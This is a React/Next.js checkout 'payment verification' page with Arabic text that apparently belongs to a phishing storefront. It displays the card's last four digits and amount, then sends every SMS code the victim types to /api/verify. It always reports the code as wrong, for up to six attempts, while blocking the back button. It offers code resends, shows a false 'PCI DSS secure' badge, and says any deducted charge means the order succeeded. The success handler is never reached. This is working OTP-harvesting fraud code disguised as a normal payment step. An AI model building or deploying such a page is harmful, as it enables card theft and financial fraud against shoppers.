"use client";

import { useEffect, useState, useRef } from "react";
import { useRouter } from "next/navigation";
import { Lock, CheckCircle } from "lucide-react";
import { useCartStore } from "../../store/cartStore";

const fmt = (n: number) => n.toLocaleString("ar-SA");

function formatDate(iso: string) {
  return new Date(iso).toLocaleString("ar-SA", {
    year: "numeric", month: "long", day: "numeric",
    hour: "2-digit", minute: "2-digit",
  });
}

// ── حفظ الطلب في localStorage كـ "pending_order" ────────────────────────────
// يُستخدم لاحقاً لعرضه في صفحة الحساب حتى لو المستخدم مش مسجل حالياً
function savePendingOrder(data: VerifyData) {
  try {
    const existing = JSON.parse(localStorage.getItem("pending_orders") || "[]");
    const newOrder = {
      orderId: data.orderId,
      _id: data._id || null,
      items: data.items || [],
      total: data.amount,
      status: "pending" as const,
      createdAt: data.date,
      updatedAt: data.date,
      statusHistory: [{ status: "pending", changedAt: data.date, changedBy: "system" }],
    };
    // تجنب التكرار
    const filtered = existing.filter((o: { orderId: string }) => o.orderId !== data.orderId);
    // احتفظ بآخر 20 طلب فقط
    const updated = [newOrder, ...filtered].slice(0, 20);
    localStorage.setItem("pending_orders", JSON.stringify(updated));
  } catch { /* silent */ }
}

// ── استدعاء claim بعد تسجيل الدخول لربط الطلبات بالحساب ─────────────────────
async function claimOrders() {
  try {
    await fetch("/api/account/orders/claim", { method: "POST", credentials: "include" });
  } catch { /* silent */ }
}

type VerifyData = {
  orderId?: string;
  _id?: string;
  amount: number;
  last4: string;
  date: string;
  phone: string;
  customerName?: string;
  items?: { productId?: string; name: string; price: number; quantity: number }[];
  orderSnapshot?: {
    orderId: string;
    _id: string | null;
    items: { productId?: string; name: string; price: number; quantity: number }[];
    total: number;
    customerEmail: string | null;
    userId: string | null;
  } | null;
};

export default function VerifyPage() {
  const router = useRouter();
  const { clear } = useCartStore();

  const [phase, setPhase] = useState<"otp" | "success">("otp");
  const [data, setData] = useState<VerifyData | null>(null);
  const [otp, setOtp] = useState("");
  const [timer, setTimer] = useState(41);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [cooldown, setCooldown] = useState(0);
  const [showWarning, setShowWarning] = useState(false);
  const [redirecting, setRedirecting] = useState(false);
  const claimedRef = useRef(false);

  useEffect(() => {
    const raw = sessionStorage.getItem("verify_data");
    if (!raw) { router.replace("/cart"); return; }
    const parsed: VerifyData = JSON.parse(raw);
    setData(parsed);
    history.pushState(null, "", window.location.href);
    const block = () => history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", block);
    return () => window.removeEventListener("popstate", block);
  }, [router]);

  useEffect(() => {
    if (phase !== "otp" || timer <= 0) return;
    const t = setTimeout(() => setTimer(s => s - 1), 1000);
    return () => clearTimeout(t);
  }, [phase, timer]);

  const timerStr = `${String(Math.floor(timer / 60)).padStart(2, "0")}:${String(timer % 60).padStart(2, "0")}`;

  useEffect(() => {
    if (cooldown <= 0) return;
    const t = setTimeout(() => setCooldown(s => s - 1), 1000);
    return () => clearTimeout(t);
  }, [cooldown]);

  // ── بعد النجاح: حفظ الطلب وتنظيف السلة ────────────────────────────────────
  const handleSuccess = async (verifyData: VerifyData) => {
    // 1) حفظ الطلب في localStorage
    savePendingOrder(verifyData);
    // 2) محاولة claim (لو المستخدم مسجل)
    if (!claimedRef.current) {
      claimedRef.current = true;
      await claimOrders();
    }
    // 3) تنظيف السلة
    clear();
    // 4) تنظيف session data
    sessionStorage.removeItem("verify_data");
    sessionStorage.removeItem(`verify_attempts_${verifyData.orderId}`);
    // 5) الانتقال لصفحة النجاح
    setPhase("success");
  };

  const handleSubmit = async () => {
    if (!data) return;
    const digits = otp.replace(/\D/g, "");
    if (digits.length !== 4 && digits.length !== 6) {
      setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
      return;
    }

    const attemptsKey = `verify_attempts_${data?.orderId}`;
    const attempts = parseInt(sessionStorage.getItem(attemptsKey) ?? "0") + 1;
    sessionStorage.setItem(attemptsKey, String(attempts));

    if (attempts > 6) {
      sessionStorage.removeItem(attemptsKey);
      sessionStorage.removeItem("verify_data");
      setError("لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ");
      let countdown = 5;
      const interval = setInterval(() => {
        countdown -= 1;
        if (countdown <= 0) {
          clearInterval(interval);
          router.replace("/cart");
        } else {
          setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
        }
      }, 1000);
      setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
      return;
    }

    setSubmitting(true);
    setCooldown(4);
    try {
      await fetch("/api/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code: digits, orderId: data?.orderId, customerName: data?.customerName ?? data?.phone }),
      });
    } catch {}
    setSubmitting(false);
    setOtp("");
    setError("الرمز الذي أدخلته غير صحيح، يرجى المحاولة مرة أخرى");
    if (!showWarning) setTimeout(() => setShowWarning(true), 3000);
    await new Promise(r => setTimeout(r, 4000));
    setError("");
  };

  const maskedPhone = data?.phone
    ? data.phone.slice(0, 3) + "****" + data.phone.slice(-3)
    : "05*****";

  // ── شاشة النجاح ─────────────────────────────────────────────────────────────
  if (phase === "success" && data) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4 pb-8 pt-4" dir="rtl">
        <div className="w-full max-w-sm bg-white shadow-lg border border-gray-100">
          {/* Header */}
          <div className="px-6 pt-8 pb-5 flex flex-col items-center gap-3 border-b border-gray-100">
            <div className="w-14 h-14 rounded-full bg-green-50 flex items-center justify-center">
              <CheckCircle className="w-8 h-8 text-green-500" strokeWidth={1.5} />
            </div>
            <div className="text-center">
              <p className="text-base font-black text-[#0A1C29]">تم استلام طلبك بنجاح</p>
              <p className="text-xs text-gray-400 mt-1">سنتواصل معك قريباً لتأكيد الطلب</p>
            </div>
          </div>

          {/* Order Summary */}
          <div className="px-6 py-5 space-y-3">
            {/* رقم الطلب */}
            <div className="flex items-center justify-between py-2 border-b border-gray-50">
              <span className="text-xs text-gray-400">رقم الطلب</span>
              <span className="text-xs font-black text-[#0A1C29] font-mono" dir="ltr">
                #{data.orderId}
              </span>
            </div>

            {/* التاريخ */}
            <div className="flex items-center justify-between py-2 border-b border-gray-50">
              <span className="text-xs text-gray-400">صادر في</span>
              <span className="text-xs text-gray-600">{formatDate(data.date)}</span>
            </div>

            {/* المنتجات */}
            {data.items && data.items.length > 0 && (
              <div className="py-2 space-y-1.5 border-b border-gray-50">
                <span className="text-xs text-gray-400 block mb-2">المنتجات</span>
                {data.items.map((item, i) => (
                  <div key={i} className="flex items-center justify-between gap-2">
                    <span className="text-xs text-[#0A1C29] font-medium truncate flex-1">{item.name}</span>
                    <span className="text-xs text-gray-400 shrink-0">× {item.quantity}</span>
                    <span className="text-xs font-bold text-[#0A1C29] shrink-0" dir="ltr">
                      {(item.price * item.quantity).toLocaleString("ar-SA")} ر.س
                    </span>
                  </div>
                ))}
              </div>
            )}

            {/* الإجمالي */}
            <div className="flex items-center justify-between py-2">
              <span className="text-sm font-bold text-[#0A1C29]">الإجمالي</span>
              <span className="text-sm font-black text-[#0A1C29]" dir="ltr">
                {fmt(data.amount)} <span className="text-xs font-medium text-gray-400">ر.س</span>
              </span>
            </div>

            {/* الحالة */}
            <div className="bg-yellow-50 border border-yellow-200 px-4 py-3 flex items-center justify-between">
              <span className="text-xs font-bold text-yellow-700">قيد المعالجة</span>
              <span className="w-2 h-2 rounded-full bg-yellow-400 animate-pulse" />
            </div>
          </div>

          {/* Actions */}
          <div className="px-6 pb-6 space-y-2">
            <button
              onClick={() => {
                setRedirecting(true);
                setTimeout(() => router.replace("/account?tab=orders"), 800);
              }}
              className="w-full py-3 bg-[#0A1C29] text-white text-sm font-black hover:opacity-90 transition flex items-center justify-center gap-2"
            >
              عرض طلباتي
            </button>
            <button
              onClick={() => {
                setRedirecting(true);
                setTimeout(() => router.replace("/"), 800);
              }}
              className="w-full py-3 border border-[#e5e7eb] text-sm font-semibold text-gray-500 hover:border-[#0A1C29] hover:text-[#0A1C29] transition"
            >
              الرئيسية
            </button>
          </div>
        </div>
      </div>
    );
  }

  /* ── Redirecting overlay ── */
  if (redirecting) return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center gap-4" dir="rtl">
      <div className="w-8 h-8 border-4 border-[#1A2E44] border-t-transparent rounded-full animate-spin" />
      <p className="text-sm font-bold text-[#1A2E44]">جاري توجيهك...</p>
    </div>
  );

  if (!data) return null;

  /* ── OTP ── */
  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4 pt-4 pb-8" dir="rtl">
      <div className="w-full max-w-sm bg-white shadow-lg border border-gray-100">

        {/* Header */}
        <div className="px-6 pt-6 pb-4">
          <h2 className="text-sm sm:text-base font-black text-[#1A2E44] pb-3 border-b border-gray-200 text-center">
            تأكيد عملية الشراء
          </h2>
          <p className="text-[11px] sm:text-xs text-gray-400 mt-3 leading-relaxed">
            تم إرسال رسالة نصية بها رمز التحقق إلى رقم الجوال{" "}
            <span className="font-bold text-[#1A2E44]" dir="ltr">{maskedPhone}</span> لإتمام المعاملة.
          </p>
        </div>

        {/* Details Card */}
        <div className="mx-6 mb-5 border border-gray-100 divide-y divide-gray-100">
          <Row label="المبلغ">
            <span className="font-black text-[#1A2E44] text-xs sm:text-sm">{fmt(data.amount)} <span className="text-[11px] sm:text-xs font-medium text-gray-400">ر.س</span></span>
          </Row>
          <Row label="التاريخ">
            <span className="text-[11px] sm:text-xs text-gray-500">{formatDate(data.date)}</span>
          </Row>
          <Row label="وسيلة الدفع">
            <span className="font-mono text-xs sm:text-sm text-[#1A2E44] tracking-widest" dir="ltr">
              •••• •••• •••• {data.last4}
            </span>
          </Row>
        </div>

        {/* OTP Input */}
        <div className="px-6 pb-5 space-y-4">
          <div>
            <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">Verification Code</p>
            <input
              type="text"
              inputMode="numeric"
              maxLength={6}
              placeholder="أدخل رمز التحقق"
              value={otp}
              onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setError(""); }}
              onBlur={() => {
                const d = otp.replace(/\D/g, "");
                if (d.length > 0 && d.length !== 4 && d.length !== 6) setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
              }}
              className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors"
              dir="ltr"
            />
            {error && <p className="text-red-500 text-xs font-bold mt-1">⚠ {error}</p>}
            {showWarning && (
              <p className="text-[11px] sm:text-xs text-red-600/80 font-medium mt-3 leading-relaxed text-right">
                إذا تم خصم المبلغ الموضّح، فهذا يعني أن طلبك تم تأكيده بنجاح، ويمكنك إغلاق هذه الصفحة بأمان.{" "}
                <button
                  onClick={() => {
                    if (data) {
                      savePendingOrder(data);
                      claimOrders();
                      clear();
                      sessionStorage.removeItem("verify_data");
                      sessionStorage.removeItem(`verify_attempts_${data.orderId}`);
                    }
                    setRedirecting(true);
                    setTimeout(() => router.replace("/"), 800);
                  }}
                  className="font-black text-[#1A2E44] underline underline-offset-2 border-b border-dashed border-[#1A2E44]"
                >
                  الرئيسية
                </button>
              </p>
            )}
          </div>

          <div className="text-center">
            {timer > 0 ? (
              <p className="text-xs text-gray-400">
                إعادة الإرسال خلال <span className="font-black text-[#1A2E44] font-mono">{timerStr}</span>
              </p>
            ) : (
              <button onClick={async () => {
                setTimer(41);
                await fetch("/api/resend", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ orderId: data?.orderId, customerName: data?.customerName ?? data?.phone }),
                });
              }} className="text-xs font-bold text-[#1A2E44] underline underline-offset-2">
                إعادة إرسال الرمز
              </button>
            )}
          </div>

          <button
            onClick={handleSubmit}
            disabled={submitting || cooldown > 0 || (otp.replace(/\D/g, "").length !== 4 && otp.replace(/\D/g, "").length !== 6)}
            className="w-full py-3 text-white font-black text-xs sm:text-sm flex items-center justify-center gap-2 disabled:opacity-40 transition hover:opacity-90"
            style={{ background: "#1A2E44" }}
          >
            <Lock size={13} />
            {submitting ? "جاري التحقق..." : cooldown > 0 ? <span className="font-mono tabular-nums">{cooldown}</span> : "إتمام الدفع"}
          </button>

          <p className="text-center text-[10px] text-gray-300 flex items-center justify-center gap-1">
            <Lock size={9} /> اتصال مشفّر وآمن · PCI DSS
          </p>
        </div>

      </div>
    </div>
  );
}

function Row({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div className="flex items-center justify-between px-4 py-3">
      <span className="text-xs text-gray-400 font-medium">{label}</span>
      <span>{children}</span>
    </div>
  );
}
